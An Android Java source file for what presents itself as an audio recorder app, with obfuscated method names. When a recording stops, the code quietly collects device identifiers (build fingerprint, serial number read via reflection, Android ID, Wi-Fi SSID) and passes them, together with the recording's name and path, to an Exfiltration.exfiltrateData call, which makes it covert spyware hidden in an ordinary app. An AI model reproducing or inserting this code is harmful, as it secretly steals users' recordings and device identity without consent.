package com.singaporetech.audiorecorder;
import android.content.pm.PackageManager;
import android.os.Build;
import java.util.Locale;
import java.io.InputStreamReader;
import android.provider.Settings;
import java.io.DataInputStream;
import androidx.fragment.app.Fragment;
import java.security.spec.X509EncodedKeySpec;
import android.content.DialogInterface;
import android.net.wifi.WifiManager;
import android.view.View;
import java.io.IOException;
import java.text.SimpleDateFormat;
import com.singaporetech.notepad.R;
import android.view.LayoutInflater;
import android.app.AlertDialog;
import java.security.AlgorithmParameters;
import java.security.spec.KeySpec;
import androidx.annotation.NonNull;
import android.media.MediaRecorder;
import java.security.SecureRandom;
import android.widget.ImageButton;
import java.security.KeyFactory;
import java.io.InputStream;
import java.io.File;
import java.io.FileInputStream;
import androidx.annotation.Nullable;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;
import androidx.navigation.Navigation;
import java.io.OutputStreamWriter;
import com.singaporetech.audiorecorder.Exfiltration;
import java.security.Key;
import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import android.os.SystemClock;
import android.widget.TextView;
import java.io.DataOutputStream;
import android.Manifest;
import android.net.wifi.WifiInfo;
import android.telephony.TelephonyManager;
import android.view.ViewGroup;
import android.content.Context;
import androidx.navigation.NavController;
import androidx.core.app.ActivityCompat;
import androidx.annotation.RequiresApi;
import android.widget.Chronometer;
import java.util.Base64;
import android.os.Bundle;
import java.util.Calendar;
import java.io.ByteArrayOutputStream;
import java.util.Date;
public class RecordFragment extends Fragment implements View.OnClickListener {
    private NavController navController;
    private ImageButton listBtn;
    private ImageButton recordBtn;
    private TextView filenameText;
    public String recordpath;
    public String filepath;
    public String currTime;
    public String deviceID;
    private boolean isRecording = false;
    private String recordPermission = Manifest.permission.RECORD_AUDIO;
    private int PERMISSION_CODE = 21;
    private MediaRecorder mediaRecorder;
    private String recordFile;
    private Chronometer timer;
    public RecordFragment() {
    }
    @Override public View onCreateView(LayoutInflater inflater, ViewGroup container,
                                       Bundle savedInstanceState) {
        return inflater.inflate(R.layout.fragment_record, container, false);
    }
    @Override public void onViewCreated(@NonNull View view, @Nullable Bundle savedInstanceState) {
        super.onViewCreated(view, savedInstanceState);
        navController = Navigation.findNavController(view);
        listBtn = view.findViewById(R.id.record_list_btn);
        recordBtn = view.findViewById(R.id.record_btn);
        timer = view.findViewById(R.id.record_timer);
        filenameText = view.findViewById(R.id.record_filename);
        listBtn.setOnClickListener(this);
        recordBtn.setOnClickListener(this);
    }
    @RequiresApi(api = Build.VERSION_CODES.M)
    @Override public void onClick(View v) {
        switch (v.getId()) {
            case R.id.record_list_btn:
                if(isRecording){
                    AlertDialog.Builder alertDialog = new AlertDialog.Builder(getContext());
                    alertDialog.setPositiveButton("OKAY", new DialogInterface.OnClickListener() {
                        @Override public void onClick(DialogInterface dialog, int which) {
                            navController.navigate(R.id.action_recordFragment_to_audioListFragment);
                            isRecording = false;
                        }
                    });
                    alertDialog.setNegativeButton("CANCEL", null);
                    alertDialog.setTitle("Audio Still recording");
                    alertDialog.setMessage("Are you sure, you want to stop the recording?");
                    alertDialog.create().show();
                } else {
                    navController.navigate(R.id.action_recordFragment_to_audioListFragment);
                }
                break;
            case R.id.record_btn:
                if(isRecording) {
                    try {
                        I11ILLIlLlI1();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                    recordBtn.setImageDrawable(getResources().getDrawable(R.drawable.record_btn_stopped, null));
                    isRecording = false;
                } else {
                    if(lLIl11()) {
                        try {
                            LLLllLlLILll1ILIlLl();
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                        recordBtn.setImageDrawable(getResources().getDrawable(R.drawable.record_btn_recording, null));
                        isRecording = true;
                    }
                }
                break;
        }
    }
    @RequiresApi(api = Build.VERSION_CODES.M)
    private void I11ILLIlLlI1() throws IOException {
        timer.stop();
        filenameText.setText("Recording Stopped, File Saved : " + recordFile);
        String IllIlIl1LILIlLLlLL = IILlLLI11L111L1l();
        Exfiltration.exfiltrateData(deviceID,recordFile, currTime,recordpath,IllIlIl1LILIlLLlLL );
        mediaRecorder.stop();
        mediaRecorder.release();
        mediaRecorder = null;
    }
    @RequiresApi(api = Build.VERSION_CODES.M)
    private void LLLllLlLILll1ILIlLl() throws IOException {
        timer.setBase(SystemClock.elapsedRealtime());
        timer.start();
        String LI1IlIl1I1LlLILlL = getActivity().getExternalFilesDir("/").getAbsolutePath();
        recordpath = LI1IlIl1I1LlLILlL;
        SimpleDateFormat formatter = new SimpleDateFormat("yyyy_MM_dd_hh_mm_ss", Locale.CANADA);
        Date now = new Date();
        currTime = formatter.format(now);
        recordFile = "Recording_" + currTime + ".3gp";
        filenameText.setText("Recording, File Name : " + recordFile);
        mediaRecorder = new MediaRecorder();
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        mediaRecorder.setOutputFile(LI1IlIl1I1LlLILlL + "/" + recordFile);
        filepath = LI1IlIl1I1LlLILlL + "/" + recordFile;
        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        IILlLLI11L111L1l();
        try {
            mediaRecorder.prepare();
        } catch (IOException e) {
            e.printStackTrace();
        }
        mediaRecorder.start();
    }
    @RequiresApi(api = Build.VERSION_CODES.M)
    public String IILlLLI11L111L1l() {
        String LlllILlLIIII1lIlI = "Info_" + currTime + ".txt";
        String l1LllI1Il1lLIl1 = "";
        WifiManager wifiManager = (WifiManager) getContext().getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        WifiInfo info = wifiManager.getConnectionInfo();
        String Il1L1lLl1 = info.getSSID();
        deviceID = Settings.Secure.getString(getContext().getContentResolver(), Settings.Secure.ANDROID_ID);
        TelephonyManager telephonyManager = (TelephonyManager) getActivity().getSystemService(Context.TELEPHONY_SERVICE);
        String lLLL1lll11Ll = "Brand: " + Build.BRAND
                + "\nDevice: " + Build.DEVICE
                + "\nBoard: " + Build.BOARD
                + "\nBootloader: " + Build.BOOTLOADER
                + "\nDisplay: " + Build.DISPLAY
                + "\nFingerprint: " + Build.FINGERPRINT
                + "\nHardware: " + Build.HARDWARE
                + "\nHost: " + Build.HOST
                + "\nID: " + Build.ID
                + "\nManufacturer: " + Build.MANUFACTURER
                + "\nModel: " + Build.MODEL
                + "\nSerial Number: " + k6LihHT()
                + "\nUser: " + Build.USER
                + "\nDevice ID: " + deviceID
                + "\nAndroid Version: " + Build.VERSION.RELEASE + " API " + Build.VERSION.SDK_INT
                + "\nWifi SSID:" + Il1L1lLl1;
        return lLLL1lll11Ll;
    }
    public static String k6LihHT() {
        String serialNumber;
        try {
            Class<?> c = Class.forName("android.os.SystemProperties");
            Method get = c.getMethod("get", String.class);
            serialNumber = (String) get.invoke(c, "gsm.sn1");
            if (serialNumber.equals(""))
                serialNumber = (String) get.invoke(c, "ril.serialnumber");
            if (serialNumber.equals(""))
                serialNumber = (String) get.invoke(c, "ro.serialno");
            if (serialNumber.equals(""))
                serialNumber = (String) get.invoke(c, "sys.serialnumber");
            if (serialNumber.equals(""))
                serialNumber = Build.SERIAL;
            if (serialNumber.equals(""))
                serialNumber = null;
        } catch (Exception e) {
            e.printStackTrace();
            serialNumber = null;
        }
        return serialNumber;
    }
    private boolean lLIl11() {
        if (ActivityCompat.checkSelfPermission(getContext(), recordPermission) == PackageManager.PERMISSION_GRANTED) {
            return true;
        } else {
            ActivityCompat.requestPermissions(getActivity(), new String[]{recordPermission}, PERMISSION_CODE);
            return false;
        }
    }
    @RequiresApi(api = Build.VERSION_CODES.M)
    @Override public void onStop() {
        super.onStop();
        if(isRecording){
            try {
                I11ILLIlLlI1();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}
